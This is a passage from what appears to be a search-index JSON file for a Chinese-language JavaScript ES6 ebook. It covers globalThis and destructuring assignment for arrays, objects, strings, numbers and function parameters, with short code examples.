\u65b9\u6cd5\u4e8c\nvar getGlobal = function () {\n  if (typeof self !== 'undefined') { return self; }\n  if (typeof window !== 'undefined') { return window; }\n  if (typeof global !== 'undefined') { return global; }\n  throw new Error('unable to locate global object');\n};\n</code></pre> <p>\u73b0\u5728\u6709\u4e00\u4e2a\u63d0\u6848\uff0c\u5728\u8bed\u8a00\u6807\u51c6\u7684\u5c42\u9762\uff0c\u5f15\u5165<code>globalThis</code>\u4f5c\u4e3a\u9876\u5c42\u5bf9\u8c61\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4efb\u4f55\u73af\u5883\u4e0b\uff0c<code>globalThis</code>\u90fd\u662f\u5b58\u5728\u7684\uff0c\u90fd\u53ef\u4ee5\u4ece\u5b83\u62ff\u5230\u9876\u5c42\u5bf9\u8c61\uff0c\u6307\u5411\u5168\u5c40\u73af\u5883\u4e0b\u7684<code>this</code>\u3002</p> <p>\u57ab\u7247\u5e93<code>global-this</code>\u6a21\u62df\u4e86\u8fd9\u4e2a\u63d0\u6848\uff0c\u53ef\u4ee5\u5728\u6240\u6709\u73af\u5883\u62ff\u5230<code>globalThis</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/","title":"\u53d8\u91cf\u7684\u89e3\u6784\u8d4b\u503c","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 16315  \u9605\u8bfb33\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_2","title":"\u6570\u7ec4","text":""},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_3","title":"\u7528\u6cd5","text":"<p>ES6 \u5141\u8bb8\u6309\u7167\u4e00\u5b9a\u6a21\u5f0f\uff0c\u4ece\u6570\u7ec4\u548c\u5bf9\u8c61\u4e2d\u63d0\u53d6\u503c\uff0c\u5bf9\u53d8\u91cf\u8fdb\u884c\u8d4b\u503c\uff0c\u8fd9\u88ab\u79f0\u4e3a\u89e3\u6784\uff08Destructuring\uff09\u3002</p> <pre><code>let [a, b, c] = [1, 2, 3];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u53ef\u4ee5\u4ece\u6570\u7ec4\u4e2d\u63d0\u53d6\u503c\uff0c\u6309\u7167\u5bf9\u5e94\u4f4d\u7f6e\uff0c\u5bf9\u53d8\u91cf\u8d4b\u503c\u3002</p> <p>\u672c\u8d28\u4e0a\uff0c\u8fd9\u79cd\u5199\u6cd5\u5c5e\u4e8e\u201c\u6a21\u5f0f\u5339\u914d\u201d\uff0c\u53ea\u8981\u7b49\u53f7\u4e24\u8fb9\u7684\u6a21\u5f0f\u76f8\u540c\uff0c\u5de6\u8fb9\u7684\u53d8\u91cf\u5c31\u4f1a\u88ab\u8d4b\u4e88\u5bf9\u5e94\u7684\u503c\u3002</p> <pre><code>let [foo, [[bar], baz]] = [1, [[2], 3]];\nfoo // 1\nbar // 2\nbaz // 3\n\nlet [ , , third] = [\"foo\", \"bar\", \"baz\"];\nthird // \"baz\"\n\nlet [x, , y] = [1, 2, 3];\nx // 1\ny // 3\n\nlet [head, ...tail] = [1, 2, 3, 4];\nhead // 1\ntail // [2, 3, 4]\n\nlet [x, y, ...z] = ['a'];\nx // \"a\"\ny // undefined\nz // []\n</code></pre> <p>\u5982\u679c\u89e3\u6784\u4e0d\u6210\u529f\uff0c\u53d8\u91cf\u7684\u503c\u5c31\u7b49\u4e8e<code>undefined</code>\u3002</p> <pre><code>let [foo] = [];\nlet [bar, foo] = [1];\n</code></pre> <p>\u4ee5\u4e0a\u4e24\u79cd\u60c5\u51b5\u90fd\u5c5e\u4e8e\u89e3\u6784\u4e0d\u6210\u529f\uff0c<code>foo</code>\u7684\u503c\u90fd\u4f1a\u7b49\u4e8e<code>undefined</code>\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\u4e0d\u5b8c\u5168\u89e3\u6784\uff0c\u5373\u7b49\u53f7\u5de6\u8fb9\u7684\u6a21\u5f0f\uff0c\u53ea\u5339\u914d\u4e00\u90e8\u5206\u7684\u7b49\u53f7\u53f3\u8fb9\u7684\u6570\u7ec4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u89e3\u6784\u4f9d\u7136\u53ef\u4ee5\u6210\u529f\u3002</p> <pre><code>let [x, y] = [1, 2, 3];\nx // 1\ny // 2\n\nlet [a, [b], d] = [1, [2, 3], 4];\na // 1\nb // 2\nd // 4\n</code></pre> <p>\u4e0a\u9762\u4e24\u4e2a\u4f8b\u5b50\uff0c\u90fd\u5c5e\u4e8e\u4e0d\u5b8c\u5168\u89e3\u6784\uff0c\u4f46\u662f\u53ef\u4ee5\u6210\u529f\u3002</p> <p>\u5982\u679c\u7b49\u53f7\u7684\u53f3\u8fb9\u4e0d\u662f\u6570\u7ec4\uff08\u6216\u8005\u4e25\u683c\u5730\u8bf4\uff0c\u4e0d\u662f\u53ef\u904d\u5386\u7684\u7ed3\u6784\uff0c\u53c2\u89c1\u300aIterator\u300b\u4e00\u7ae0\uff09\uff0c\u90a3\u4e48\u5c06\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nlet [foo] = 1;\nlet [foo] = false;\nlet [foo] = NaN;\nlet [foo] = undefined;\nlet [foo] = null;\nlet [foo] = {};\n</code></pre> <p>\u4e0a\u9762\u7684\u8bed\u53e5\u90fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u7b49\u53f7\u53f3\u8fb9\u7684\u503c\uff0c\u8981\u4e48\u8f6c\u4e3a\u5bf9\u8c61\u4ee5\u540e\u4e0d\u5177\u5907 Iterator \u63a5\u53e3\uff08\u524d\u4e94\u4e2a\u8868\u8fbe\u5f0f\uff09\uff0c\u8981\u4e48\u672c\u8eab\u5c31\u4e0d\u5177\u5907 Iterator \u63a5\u53e3\uff08\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff09\u3002</p> <p>\u5bf9\u4e8e Set \u7ed3\u6784\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684\u89e3\u6784\u8d4b\u503c\u3002</p> <pre><code>let [x, y, z] = new Set(['a', 'b', 'c']);\nx // \"a\"\n</code></pre> <p>\u4e8b\u5b9e\u4e0a\uff0c\u53ea\u8981\u67d0\u79cd\u6570\u636e\u7ed3\u6784\u5177\u6709 Iterator \u63a5\u53e3\uff0c\u90fd\u53ef\u4ee5\u91c7\u7528\u6570\u7ec4\u5f62\u5f0f\u7684\u89e3\u6784\u8d4b\u503c\u3002</p> <pre><code>function* fibs() {\n  let a = 0;\n  let b = 1;\n  while (true) {\n    yield a;\n    [a, b] = [b, a + b];\n  }\n}\n\nlet [first, second, third, fourth, fifth, sixth] = fibs();\nsixth // 5\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>fibs</code>\u662f\u4e00\u4e2a Generator \u51fd\u6570\uff08\u53c2\u89c1\u300aGenerator \u51fd\u6570\u300b\u4e00\u7ae0\uff09\uff0c\u539f\u751f\u5177\u6709 Iterator \u63a5\u53e3\u3002\u89e3\u6784\u8d4b\u503c\u4f1a\u4f9d\u6b21\u4ece\u8fd9\u4e2a\u63a5\u53e3\u83b7\u53d6\u503c\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_4","title":"\u9ed8\u8ba4\u503c","text":"<p>\u89e3\u6784\u8d4b\u503c\u5141\u8bb8\u6307\u5b9a\u9ed8\u8ba4\u503c\u3002</p> <pre><code>let [foo = true] = [];\nfoo // true\n\nlet [x, y = 'b'] = ['a']; // x='a', y='b'\nlet [x, y = 'b'] = ['a', undefined]; // x='a', y='b'\n</code></pre> <p>\u6ce8\u610f\uff0cES6 \u5185\u90e8\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08<code>===</code>\uff09\uff0c\u5224\u65ad\u4e00\u4e2a\u4f4d\u7f6e\u662f\u5426\u6709\u503c\u3002\u6240\u4ee5\uff0c\u53ea\u6709\u5f53\u4e00\u4e2a\u6570\u7ec4\u6210\u5458\u4e25\u683c\u7b49\u4e8e<code>undefined</code>\uff0c\u9ed8\u8ba4\u503c\u624d\u4f1a\u751f\u6548\u3002</p> <pre><code>let [x = 1] = [undefined];\nx // 1\n\nlet [x = 1] = [null];\nx // null\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u6570\u7ec4\u6210\u5458\u662f<code>null</code>\uff0c\u9ed8\u8ba4\u503c\u5c31\u4e0d\u4f1a\u751f\u6548\uff0c\u56e0\u4e3a<code>null</code>\u4e0d\u4e25\u683c\u7b49\u4e8e<code>undefined</code>\u3002</p> <p>\u5982\u679c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u662f\u60f0\u6027\u6c42\u503c\u7684\uff0c\u5373\u53ea\u6709\u5728\u7528\u5230\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u6c42\u503c\u3002</p> <pre><code>function f() {\n  console.log('aaa');\n}\n\nlet [x = f()] = [1];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56e0\u4e3a<code>x</code>\u80fd\u53d6\u5230\u503c\uff0c\u6240\u4ee5\u51fd\u6570<code>f</code>\u6839\u672c\u4e0d\u4f1a\u6267\u884c\u3002\u4e0a\u9762\u7684\u4ee3\u7801\u5176\u5b9e\u7b49\u4ef7\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\u3002</p> <pre><code>let x;\nif ([1][0] === undefined) {\n  x = f();\n} else {\n  x = [1][0];\n}\n</code></pre> <p>\u9ed8\u8ba4\u503c\u53ef\u4ee5\u5f15\u7528\u89e3\u6784\u8d4b\u503c\u7684\u5176\u4ed6\u53d8\u91cf\uff0c\u4f46\u8be5\u53d8\u91cf\u5fc5\u987b\u5df2\u7ecf\u58f0\u660e\u3002</p> <pre><code>let [x = 1, y = x] = [];     // x=1; y=1\nlet [x = 1, y = x] = [2];    // x=2; y=2\nlet [x = 1, y = x] = [1, 2]; // x=1; y=2\nlet [x = y, y = 1] = [];     // ReferenceError: y is not defined\n</code></pre> <p>\u4e0a\u9762\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u4e4b\u6240\u4ee5\u4f1a\u62a5\u9519\uff0c\u662f\u56e0\u4e3a<code>x</code>\u7528<code>y</code>\u505a\u9ed8\u8ba4\u503c\u65f6\uff0c<code>y</code>\u8fd8\u6ca1\u6709\u58f0\u660e\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_5","title":"\u5bf9\u8c61","text":""},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_6","title":"\u7b80\u4ecb","text":"<p>\u89e3\u6784\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u6570\u7ec4\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5bf9\u8c61\uff08\u5bf9\u8c61\u4f7f\u7528\u66f4\u591a\uff09\u3002\u5bf9\u8c61\u7684\u89e3\u6784\u4e0e\u6570\u7ec4\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u4e0d\u540c\u3002\u6570\u7ec4\u7684\u5143\u7d20\u662f\u6309\u6b21\u5e8f\u6392\u5217\u7684\uff0c\u53d8\u91cf\u7684\u53d6\u503c\u7531\u5b83\u7684\u4f4d\u7f6e\u51b3\u5b9a\uff1b\u800c\u5bf9\u8c61\u7684\u5c5e\u6027\u6ca1\u6709\u6b21\u5e8f\uff0c\u53d8\u91cf\u5fc5\u987b\u4e0e\u5c5e\u6027\u540c\u540d\uff0c\u624d\u80fd\u53d6\u5230\u6b63\u786e\u7684\u503c\u3002</p> <pre><code>let { bar, foo } = { foo: 'aaa', bar: 'bbb' };\nfoo // \"aaa\"\nbar // \"bbb\"\n\nlet { baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u4e24\u4e2a\u53d8\u91cf\u7684\u6b21\u5e8f\uff0c\u4e0e\u7b49\u53f7\u53f3\u8fb9\u4e24\u4e2a\u540c\u540d\u5c5e\u6027\u7684\u6b21\u5e8f\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u5bf9\u53d6\u503c\u5b8c\u5168\u6ca1\u6709\u5f71\u54cd\u3002\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u53d8\u91cf\u6ca1\u6709\u5bf9\u5e94\u7684\u540c\u540d\u5c5e\u6027\uff0c\u5bfc\u81f4\u53d6\u4e0d\u5230\u503c\uff0c\u6700\u540e\u7b49\u4e8e<code>undefined</code>\u3002</p> <p>\u5982\u679c\u89e3\u6784\u5931\u8d25\uff0c\u53d8\u91cf\u7684\u503c\u7b49\u4e8e<code>undefined</code>\u3002</p> <pre><code>let {foo} = {bar: 'baz'};\nfoo // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b49\u53f7\u53f3\u8fb9\u7684\u5bf9\u8c61\u6ca1\u6709<code>foo</code>\u5c5e\u6027\uff0c\u6240\u4ee5\u53d8\u91cf<code>foo</code>\u53d6\u4e0d\u5230\u503c\uff0c\u6240\u4ee5\u7b49\u4e8e<code>undefined</code>\u3002</p> <p>\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5c06\u73b0\u6709\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u8d4b\u503c\u5230\u67d0\u4e2a\u53d8\u91cf\u3002</p> <pre><code>// \u4f8b\u4e00\nlet { log, sin, cos } = Math;\n\n// \u4f8b\u4e8c\nconst { log } = console;\nlog('hello') // hello\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u4f8b\u4e00\u5c06<code>Math</code>\u5bf9\u8c61\u7684\u5bf9\u6570\u3001\u6b63\u5f26\u3001\u4f59\u5f26\u4e09\u4e2a\u65b9\u6cd5\uff0c\u8d4b\u503c\u5230\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0a\uff0c\u4f7f\u7528\u8d77\u6765\u5c31\u4f1a\u65b9\u4fbf\u5f88\u591a\u3002\u4f8b\u4e8c\u5c06<code>console.log</code>\u8d4b\u503c\u5230<code>log</code>\u53d8\u91cf\u3002</p> <p>\u5982\u679c\u53d8\u91cf\u540d\u4e0e\u5c5e\u6027\u540d\u4e0d\u4e00\u81f4\uff0c\u5fc5\u987b\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>let { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\n\nlet obj = { first: 'hello', last: 'world' };\nlet { first: f, last: l } = obj;\nf // 'hello'\nl // 'world'\n</code></pre> <p>\u8fd9\u5b9e\u9645\u4e0a\u8bf4\u660e\uff0c\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\u662f\u4e0b\u9762\u5f62\u5f0f\u7684\u7b80\u5199\uff08\u53c2\u89c1\u300a\u5bf9\u8c61\u7684\u6269\u5c55\u300b\u4e00\u7ae0\uff09\u3002</p> <pre><code>let { foo: foo, bar: bar } = { foo: 'aaa', bar: 'bbb' };\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\u7684\u5185\u90e8\u673a\u5236\uff0c\u662f\u5148\u627e\u5230\u540c\u540d\u5c5e\u6027\uff0c\u7136\u540e\u518d\u8d4b\u7ed9\u5bf9\u5e94\u7684\u53d8\u91cf\u3002\u771f\u6b63\u88ab\u8d4b\u503c\u7684\u662f\u540e\u8005\uff0c\u800c\u4e0d\u662f\u524d\u8005\u3002</p> <pre><code>let { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\nfoo // error: foo is not defined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>foo</code>\u662f\u5339\u914d\u7684\u6a21\u5f0f\uff0c<code>baz</code>\u624d\u662f\u53d8\u91cf\u3002\u771f\u6b63\u88ab\u8d4b\u503c\u7684\u662f\u53d8\u91cf<code>baz</code>\uff0c\u800c\u4e0d\u662f\u6a21\u5f0f<code>foo</code>\u3002</p> <p>\u4e0e\u6570\u7ec4\u4e00\u6837\uff0c\u89e3\u6784\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5d4c\u5957\u7ed3\u6784\u7684\u5bf9\u8c61\u3002</p> <pre><code>let obj = {\n  p: [\n    'Hello',\n    { y: 'World' }\n  ]\n};\n\nlet { p: [x, { y }] } = obj;\nx // \"Hello\"\ny // \"World\"\n</code></pre> <p>\u6ce8\u610f\uff0c\u8fd9\u65f6<code>p</code>\u662f\u6a21\u5f0f\uff0c\u4e0d\u662f\u53d8\u91cf\uff0c\u56e0\u6b64\u4e0d\u4f1a\u88ab\u8d4b\u503c\u3002\u5982\u679c<code>p</code>\u4e5f\u8981\u4f5c\u4e3a\u53d8\u91cf\u8d4b\u503c\uff0c\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>let obj = {\n  p: [\n    'Hello',\n    { y: 'World' }\n  ]\n};\n\nlet { p, p: [x, { y }] } = obj;\nx // \"Hello\"\ny // \"World\"\np // [\"Hello\", {y: \"World\"}]\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const node = {\n  loc: {\n    start: {\n      line: 1,\n      column: 5\n    }\n  }\n};\n\nlet { loc, loc: { start }, loc: { start: { line }} } = node;\nline // 1\nloc  // Object {start: Object}\nstart // Object {line: 1, column: 5}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6709\u4e09\u6b21\u89e3\u6784\u8d4b\u503c\uff0c\u5206\u522b\u662f\u5bf9<code>loc</code>\u3001<code>start</code>\u3001<code>line</code>\u4e09\u4e2a\u5c5e\u6027\u7684\u89e3\u6784\u8d4b\u503c\u3002\u6ce8\u610f\uff0c\u6700\u540e\u4e00\u6b21\u5bf9<code>line</code>\u5c5e\u6027\u7684\u89e3\u6784\u8d4b\u503c\u4e4b\u4e2d\uff0c\u53ea\u6709<code>line</code>\u662f\u53d8\u91cf\uff0c<code>loc</code>\u548c<code>start</code>\u90fd\u662f\u6a21\u5f0f\uff0c\u4e0d\u662f\u53d8\u91cf\u3002</p> <p>\u4e0b\u9762\u662f\u5d4c\u5957\u8d4b\u503c\u7684\u4f8b\u5b50\u3002</p> <pre><code>let obj = {};\nlet arr = [];\n\n({ foo: obj.prop, bar: arr[0] } = { foo: 123, bar: true });\n\nobj // {prop:123}\narr // [true]\n</code></pre> <p>\u5982\u679c\u89e3\u6784\u6a21\u5f0f\u662f\u5d4c\u5957\u7684\u5bf9\u8c61\uff0c\u800c\u4e14\u5b50\u5bf9\u8c61\u6240\u5728\u7684\u7236\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u5c06\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nlet {foo: {bar}} = {baz: 'baz'};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u5bf9\u8c61\u7684<code>foo</code>\u5c5e\u6027\uff0c\u5bf9\u5e94\u4e00\u4e2a\u5b50\u5bf9\u8c61\u3002\u8be5\u5b50\u5bf9\u8c61\u7684<code>bar</code>\u5c5e\u6027\uff0c\u89e3\u6784\u65f6\u4f1a\u62a5\u9519\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u56e0\u4e3a<code>foo</code>\u8fd9\u65f6\u7b49\u4e8e<code>undefined</code>\uff0c\u518d\u53d6\u5b50\u5c5e\u6027\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u6ce8\u610f\uff0c\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\u53ef\u4ee5\u53d6\u5230\u7ee7\u627f\u7684\u5c5e\u6027\u3002</p> <pre><code>const obj1 = {};\nconst obj2 = { foo: 'bar' };\nObject.setPrototypeOf(obj1, obj2);\n\nconst { foo } = obj1;\nfoo // \"bar\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61<code>obj1</code>\u7684\u539f\u578b\u5bf9\u8c61\u662f<code>obj2</code>\u3002<code>foo</code>\u5c5e\u6027\u4e0d\u662f<code>obj1</code>\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u800c\u662f\u7ee7\u627f\u81ea<code>obj2</code>\u7684\u5c5e\u6027\uff0c\u89e3\u6784\u8d4b\u503c\u53ef\u4ee5\u53d6\u5230\u8fd9\u4e2a\u5c5e\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_7","title":"\u9ed8\u8ba4\u503c","text":"<p>\u5bf9\u8c61\u7684\u89e3\u6784\u4e5f\u53ef\u4ee5\u6307\u5b9a\u9ed8\u8ba4\u503c\u3002</p> <pre><code>var {x = 3} = {};\nx // 3\n\nvar {x, y = 5} = {x: 1};\nx // 1\ny // 5\n</code></pre> <p>\u9ed8\u8ba4\u503c\u751f\u6548\u7684\u6761\u4ef6\u662f\uff0c\u5bf9\u8c61\u7684\u5c5e\u6027\u503c\u4e25\u683c\u7b49\u4e8e<code>undefined</code>\u3002</p> <pre><code>var {x = 3} = {x: undefined};\nx // 3\n\nvar {x = 3} = {x: null};\nx // null\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c5e\u6027<code>x</code>\u7b49\u4e8e<code>null</code>\uff0c\u56e0\u4e3a<code>null</code>\u4e0e<code>undefined</code>\u4e0d\u4e25\u683c\u76f8\u7b49\uff0c\u6240\u4ee5\u662f\u4e2a\u6709\u6548\u7684\u8d4b\u503c\uff0c\u5bfc\u81f4\u9ed8\u8ba4\u503c<code>3</code>\u4e0d\u4f1a\u751f\u6548\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_8","title":"\u6ce8\u610f\u70b9","text":"<p>\uff081\uff09\u5982\u679c\u8981\u5c06\u4e00\u4e2a\u5df2\u7ecf\u58f0\u660e\u7684\u53d8\u91cf\u7528\u4e8e\u89e3\u6784\u8d4b\u503c\uff0c\u5fc5\u987b\u975e\u5e38\u5c0f\u5fc3\u3002</p> <pre><code>// \u9519\u8bef\u7684\u5199\u6cd5\nlet x;\n{x} = {x: 1};\n// SyntaxError: syntax error\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u5199\u6cd5\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a JavaScript \u5f15\u64ce\u4f1a\u5c06<code>{x}</code>\u7406\u89e3\u6210\u4e00\u4e2a\u4ee3\u7801\u5757\uff0c\u4ece\u800c\u53d1\u751f\u8bed\u6cd5\u9519\u8bef\u3002\u53ea\u6709\u4e0d\u5c06\u5927\u62ec\u53f7\u5199\u5728\u884c\u9996\uff0c\u907f\u514d JavaScript \u5c06\u5176\u89e3\u91ca\u4e3a\u4ee3\u7801\u5757\uff0c\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p> <pre><code>// \u6b63\u786e\u7684\u5199\u6cd5\nlet x;\n({x} = {x: 1});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06\u6574\u4e2a\u89e3\u6784\u8d4b\u503c\u8bed\u53e5\uff0c\u653e\u5728\u4e00\u4e2a\u5706\u62ec\u53f7\u91cc\u9762\uff0c\u5c31\u53ef\u4ee5\u6b63\u786e\u6267\u884c\u3002\u5173\u4e8e\u5706\u62ec\u53f7\u4e0e\u89e3\u6784\u8d4b\u503c\u7684\u5173\u7cfb\uff0c\u53c2\u89c1\u4e0b\u6587\u3002</p> <p>\uff083\uff09\u7531\u4e8e\u6570\u7ec4\u672c\u8d28\u662f\u7279\u6b8a\u7684\u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u5bf9\u6570\u7ec4\u8fdb\u884c\u5bf9\u8c61\u5c5e\u6027\u7684\u89e3\u6784\u3002</p> <pre><code>let arr = [1, 2, 3];\nlet {0 : first, [arr.length - 1] : last} = arr;\nfirst // 1\nlast // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5bf9\u6570\u7ec4\u8fdb\u884c\u5bf9\u8c61\u89e3\u6784\u3002\u6570\u7ec4<code>arr</code>\u7684<code>0</code>\u952e\u5bf9\u5e94\u7684\u503c\u662f<code>1</code>\uff0c<code>[arr.length - 1]</code>\u5c31\u662f<code>2</code>\u952e\uff0c\u5bf9\u5e94\u7684\u503c\u662f<code>3</code>\u3002\u65b9\u62ec\u53f7\u8fd9\u79cd\u5199\u6cd5\uff0c\u5c5e\u4e8e\u201c\u5c5e\u6027\u540d\u8868\u8fbe\u5f0f\u201d\uff08\u53c2\u89c1\u300a\u5bf9\u8c61\u7684\u6269\u5c55\u300b\u4e00\u7ae0\uff09\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_9","title":"\u5b57\u7b26\u4e32\u7684\u89e3\u6784\u8d4b\u503c","text":"<p>\u5b57\u7b26\u4e32\u4e5f\u53ef\u4ee5\u89e3\u6784\u8d4b\u503c\u3002\u8fd9\u662f\u56e0\u4e3a\u6b64\u65f6\uff0c\u5b57\u7b26\u4e32\u88ab\u8f6c\u6362\u6210\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002</p> <pre><code>const [a, b, c, d, e] = 'hello';\na // \"h\"\nb // \"e\"\nc // \"l\"\nd // \"l\"\ne // \"o\"\n</code></pre> <p>\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u90fd\u6709\u4e00\u4e2a<code>length</code>\u5c5e\u6027\uff0c\u56e0\u6b64\u8fd8\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u5c5e\u6027\u89e3\u6784\u8d4b\u503c\u3002</p> <pre><code>let {length : len} = 'hello';\nlen // 5\n</code></pre>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_10","title":"\u6570\u503c\u548c\u5e03\u5c14\u503c\u7684\u89e3\u6784\u8d4b\u503c","text":"<p>\u89e3\u6784\u8d4b\u503c\u65f6\uff0c\u5982\u679c\u7b49\u53f7\u53f3\u8fb9\u662f\u6570\u503c\u548c\u5e03\u5c14\u503c\uff0c\u5219\u4f1a\u5148\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>let {toString: s} = 123;\ns === Number.prototype.toString // true\n\nlet {toString: s} = true;\ns === Boolean.prototype.toString // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u503c\u548c\u5e03\u5c14\u503c\u7684\u5305\u88c5\u5bf9\u8c61\u90fd\u6709<code>toString</code>\u5c5e\u6027\uff0c\u56e0\u6b64\u53d8\u91cf<code>s</code>\u90fd\u80fd\u53d6\u5230\u503c\u3002</p> <p>\u89e3\u6784\u8d4b\u503c\u7684\u89c4\u5219\u662f\uff0c\u53ea\u8981\u7b49\u53f7\u53f3\u8fb9\u7684\u503c\u4e0d\u662f\u5bf9\u8c61\u6216\u6570\u7ec4\uff0c\u5c31\u5148\u5c06\u5176\u8f6c\u4e3a\u5bf9\u8c61\u3002\u7531\u4e8e<code>undefined</code>\u548c<code>null</code>\u65e0\u6cd5\u8f6c\u4e3a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5bf9\u5b83\u4eec\u8fdb\u884c\u89e3\u6784\u8d4b\u503c\uff0c\u90fd\u4f1a\u62a5\u9519\u3002</p> <pre><code>let { prop: x } = undefined; // TypeError\nlet { prop: y } = null; // TypeError\n</code></pre>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_11","title":"\u51fd\u6570\u53c2\u6570\u7684\u89e3\u6784\u8d4b\u503c","text":"<p>\u51fd\u6570\u7684\u53c2\u6570\u4e5f\u53ef\u4ee5\u4f7f\u7528\u89e3\u6784\u8d4b\u503c\u3002</p> <pre><code>function add([x, y]){\n  return x + y;\n}\n\nadd([1, 2]); // 3\n</code></pre> 